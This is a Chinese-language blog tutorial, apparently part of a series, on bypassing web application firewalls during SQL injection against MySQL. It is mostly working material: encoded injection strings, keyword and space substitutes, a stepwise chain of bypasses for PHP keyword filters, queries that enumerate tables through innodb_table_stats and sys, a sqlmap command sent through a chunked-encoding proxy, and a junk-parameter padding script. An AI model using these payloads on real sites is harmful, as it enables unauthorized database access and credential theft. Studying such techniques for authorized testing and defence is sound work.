

## 前言

第一篇只是简单书写最简单没有任何waf的情况下的理想情况，但是现实却往往充满险阻。为了能够顺利利用Sql注入漏洞我们还需要学习Sql注入的一些绕过waf技巧。

## Sql注入绕过技术

一般就是以下这几种方式:

- 大小写绕过
- 双写绕过
- 编码绕过(url编码，16进制)
- 内联注释绕过
- 关键字替换
- 等价函数绕过
- 参数污染

大小写绕过，双写绕过这两个很简单这里就不多花笔墨书写了。

## 编码绕过

使用URLEncode编码，ASCII,HEX,unicode编码绕过

```
or 1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。

十六进制编码

SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))

双重编码绕过

?id=1%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/1,2,password%252f%252a*/FROM%252f%252a*/Users--+

一些unicode编码举例：    
单引号：'
%u0027 %u02b9 %u02bc
%u02c8 %u2032
%uff07 %c0%27
%c0%a7 %e0%80%a7
空白：
%u0020 %uff00
%c0%20 %c0%a0 %e0%80%a0
左括号(:
%u0028 %uff08
%c0%28 %c0%a8
%e0%80%a8
右括号):
%u0029 %uff09
%c0%29 %c0%a9
%e0%80%a9
```

## 内联注释

这个在第一章Sql注入基础中已经讲解过了，这里添加一个内联注释绕过的实例:

[某狗SQL注入WAF绕过](https://xz.aliyun.com/t/7430)

## 关键字绕过

### and和or

```
&& 代替and
|| 代替 or
```

### 空格

```
%20 %09 %0a %0b %0c %0d %a0 /**/
```

还有一种使用()来绕过空格，但是这种方式比较鸡肋并不是通用的，在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。

例如下面可以正常执行

```sql
select * from(users)where(user_id)=1;
```

![image-20201017201616142](http://picbed.easy233.top//imgimage-20201017201616142.png)

而使用该语句
```select * from(users)where(user_id)=(0)union(select)(1),2,3,4,6,7,8,3;```

就会报错因为select并不是子查询

![image-20201017201923238](http://picbed.easy233.top//imgimage-20201017201923238.png)

## 比较运算符

### lIKE

```
1' and 1 like 0 --+
可以代替=绕过
```

### IN

在过滤等号或者过滤like等的sql注入情况下IN很有用

![image-20201018143356053](http://picbed.easy233.top//imgimage-20201018143356053.png)

### Between

BETWEEN操作符在WHERE子句中使用，作用是选取介于两个值之间的数据范围。也就说让我们可以运用一个范围(range)内抓出数据库中的值。

找出user字段中的第一个字符符合在a和b字符中间的字符的字段。

```
select * from users where substr(user,1,1) between 'a' and 'b';
```

![image-20201018144256514](http://picbed.easy233.top//imgimage-20201018144256514.png)

### <>

<>在mysql的算术运算符中意为不相等的意思和!=一样。

```
select substr('abc',1,1)<>'a';   返回0
select substr('abc',1,1)<>'b';   返回1
```

## 使用mid()等逗号被过滤的情况

```
mid(user() from 1 for 1)
substr(user() from 1 for 1)
```

## 绕过未知字段名的技巧

waf拦截了information_schema、columns、tables、database、schema等关键字或函数

```
mysql> select * from users;
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
|  3 | Dummy    | p@ssword   |
|  4 | secure   | crappy     |
|  5 | stupid   | stupidity  |
|  6 | superman | genious    |
|  7 | batman   | mob!le     |
|  8 | admin    | admin      |
|  9 | admin1   | admin1     |
| 10 | admin2   | admin2     |
| 11 | admin3   | admin3     |
| 12 | dhakkan  | dumbo      |
| 14 | admin4   | admin4     |
| 15 | security | security   |
+----+----------+------------+
14 rows in set (0.00 sec)

mysql> select `2` from (select 1,2,3 union select * from users)a limit 1,1;
+------+
| 2    |
+------+
| Dumb |
+------+
1 row in set (0.00 sec)

mysql> select `1`,`2`,`3` from (select 1,2,3 union select * from users)a limit 1,1;
+---+------+------+
| 1 | 2    | 3    |
+---+------+------+
| 1 | Dumb | Dumb |
+---+------+------+
1 row in set (0.00 sec)
```

## innodb

**`MySQL 5.7`之后的版本，在其自带的 mysql 库中，新增了`innodb_table_stats` 和`innodb_index_stats`这两张日志表。如果数据表的引擎是`innodb` ，则会在这两张表中记录表、键的信息 。**
如果waf掉了information我们可以利用这两个表注入数据库名和表名。

```
mysql> select * from mysql.innodb_table_stats;
+---------------+----------------------------+---------------------+--------+----------------------+--------------------------+
| database_name | table_name                 | last_update         | n_rows | clustered_index_size | sum_of_other_index_sizes |
+---------------+----------------------------+---------------------+--------+----------------------+--------------------------+
| challenges    | lve59e0gpb                 | 2020-09-07 19:57:13 |      0 |                    1 |                        0 |
| django_study  | auth_group                 | 2020-07-27 12:54:26 |      0 |                    1 |                        1 |
| django_study  | auth_group_permissions     | 2020-07-27 12:54:20 |      0 |                    1 |         

mysql> select * from mysql.innodb_index_stats;
+---------------+----------------------------+----------------------------------------------------------------+---------------------+--------------+------------+-------------+-----------------------------------+
| database_name | table_name                 | index_name                                                     | last_update         | stat_name    | stat_value | sample_size | stat_description                  |
+---------------+----------------------------+----------------------------------------------------------------+---------------------+--------------+------------+-------------+-----------------------------------+
| challenges    | lve59e0gpb                 | PRIMARY                                                        | 2020-09-07 19:57:13 | n_diff_pfx01 |          0 |           1 | sessid
                    |
| challenges    | lve59e0gpb                 | PRIMARY                                                        | 2020-09-07 19:57:13 | n_leaf_pages |          1 |        NULL | Number of leaf pages in the index |
```

## sys

MySQL 5.7版中，新加入了`sys` schema，里面整合了各种资料库资讯
其中对我们最有用的资讯大概就是`statement_analysis`表中的`query`，里面纪录着我们执行过的SQL语句（normalize过的）和一些数据。

```mysql
select query from sys.statement_analysis;
```

![image-20201018153854459](http://picbed.easy233.top//imgimage-20201018153854459.png)

## 等价函数

引自文章[Sql注入绕过姿势

```
hex()、bin() ==> ascii()

sleep() ==>benchmark()

concat_ws()==>group_concat()

mid()、substr() ==> substring()

@@user ==> user()

@@datadir ==> datadir()

举例：substring()和substr()无法使用时：?id=1 and ascii(lower(mid((select pwd from users limit 1,1),1,1)))=74　

或者：
substr((select 'password'),1,1) = 0x70
strcmp(left('password',1), 0x69) = 1
strcmp(left('password',1), 0x70) = 0
strcmp(left('password',1), 0x71) = -1
```

## php中常见的waf及绕过

引自文章[Sql注入绕过姿势](https://www.windylh.com/2018/06/10/Sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/)

#### 过滤and or

```
waf = 'and|or'
过滤代码 1 or 1=1   1 and 1=1
绕过方式 1 || 1=1   1 && 1=1
```

#### 过滤union

```
waf = 'and|or|union'
过滤代码 union select user,password from users
绕过方式 1 && (select user from users where userid=1)='admin'
```

#### 过滤where

```
waf = 'and|or|union|where'
过滤代码 1 && (select user from users where user_id = 1) = 'admin'
绕过方式 1 && (select user from users limit 1) = 'admin'
```

#### 过滤limit

```
waf = 'and|or|union|where|limit'
过滤代码 1 && (select user from users limit 1) = 'admin'
绕过方式 1 && (select user from users group by user_id having user_id = 1) = 'admin'#user_id聚合中user_id为1的user为admin
```

#### 过滤group by

```
waf = 'and|or|union|where|limit|group by'
过滤代码 1 && (select user from users group by user_id having user_id = 1) = 'admin'
绕过方式 1 && (select substr(group_concat(user_id),1,1) user from users ) = 1
```

#### 过滤select

```
waf = 'and|or|union|where|limit|group by|select'
过滤代码 1 && (select substr(group_concat(user_id),1,1) user from users ) = 1
绕过方式 1 && substr(user,1,1) = 'a'
```

#### 过滤’(单引号)

```
waf = 'and|or|union|where|limit|group by|select|\''
过滤代码 1 && substr(user,1,1) = 'a'
绕过方式 1 && user_id is not null    1 && substr(user,1,1) = 0x61    1 && substr(user,1,1) = unhex(61)
```

#### 过滤hex

```
waf = 'and|or|union|where|limit|group by|select|\'|hex'
过滤代码 1 && substr(user,1,1) = unhex(61)
绕过方式 1 && substr(user,1,1) = lower(conv(11,10,16)) #十进制的11转化为十六进制，并小写。
```

#### 过滤substr

```
waf = 'and|or|union|where|limit|group by|select|\'|hex|substr'
过滤代码 1 && substr(user,1,1) = lower(conv(11,10,16)) 
绕过方式 1 && lpad(user(),1,1) in 'r'
```

## 分段传输过WAF

使用burp插件，插件Github地址为:https://github.com/c0ny1/chunked-coding-converter

在burp安装完插件后，直接右键选择chunked codingconverter编码

![image-20201018155350039](http://picbed.easy233.top//imgimage-20201018155350039.png)



搭配Sqlmap跑注入：

选择Config中的proxy

![image-20201018160214171](http://picbed.easy233.top//imgimage-20201018160214171.png)

然后sqlmap执行命令``sqlmap.py -r 1.txt --batch --proxy=http://127.0.0.1:8080 --dbs``

![image-20201018160317527](http://picbed.easy233.top//imgimage-20201018160317527.png)

## 填充垃圾数据过WAF

使用以下脚本生成垃圾数据，垃圾数据放到要注入的字段前后

```python

#coding=utf-8
import random,string
from urllib import parse
varname_min = 5
varname_max = 15
data_min = 20
data_max = 25
num_min = 50
num_max = 100
def randstr(length):
  str_list = [random.choice(string.ascii_letters) for i in range(length)]
  random_str = ''.join(str_list)
  return random_str
def main():
  data={}
  for i in range(num_min,num_max):
    data[randstr(random.randint(varname_min,varname_max))]=randstr(random.randint(data_min,data_max))
  print('&'+parse.urlencode(data)+'&')
main()
```

## 推荐阅读文章

[Sql注入笔记](https://www.smi1e.top/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/#i-2)

[我的WafBypass之道（SQL注入篇）](https://paper.seebug.org/218/)

